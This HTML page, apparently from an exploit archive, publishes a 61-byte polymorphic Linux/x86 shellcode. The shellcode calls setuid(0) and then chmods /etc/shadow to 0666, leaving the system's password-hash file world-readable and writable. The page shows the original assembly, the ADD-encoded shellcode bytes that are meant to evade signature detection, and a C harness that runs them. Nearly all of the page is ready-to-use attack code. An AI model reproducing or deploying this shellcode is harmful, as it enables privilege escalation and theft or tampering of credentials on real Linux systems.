<html><head><title>Linux/x86 - Polymorphic - setuid(0) + chmod(/etc/shadow, 0666) - 61 Bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* 
 * Title: linux/x86 Shellcode Polymorphic - setuid(0) + chmod(&quot;/etc/shadow&quot;,0666) Shellcode 61 Bytes  
 * Encode  : _ADD
 * Author: antrhacks
 * Platform: Linux X86
*/

/* 0riginAl ASSembly
 31 db                	xor    %ebx,%ebx
 b0 17                	mov    $0x17,%al
 cd 80                	int    $0x80
 31 c0                	xor    %eax,%eax
 50                   	push   %eax
 68 61 64 6f 77       	push   $0x776f6461
 68 63 2f 73 68       	push   $0x68732f63
 68 2f 2f 65 74       	push   $0x74652f2f
 89 e3                	mov    %esp,%ebx
 66 b9 b6 01          	mov    $0x1b6,%cx
 b0 0f                	mov    $0xf,%al
 cd 80                	int    $0x80
 40                   	inc    %eax
 cd 80                	int    $0x80
*/


#include &quot;stdio.h&quot;

char shellcode[] = &quot;\xeb\x11\x5e\x31\xc9\xb1\x37\x80\x6c\x0e\xff\x13&quot;
                   &quot;\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff&quot;
                   &quot;\x44\xee\xc3\x2a\xe0\x93\x44\xd3\x63\x7b\x74\x77&quot;
                   &quot;\x82\x8a\x7b\x76\x42\x86\x7b\x7b\x42\x42\x78\x87&quot;
                   &quot;\x9c\xf6\x79\xcc\xc9\x14\xc3\x22\xe0\x93\x53\xe0&quot;
                   &quot;\x93&quot;; 

int main()
{
        printf(&quot; [*] Polymorphic Shellcode - length: %d\n&quot;,strlen(shellcode));
        (*(void(*)()) shellcode)();

        return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
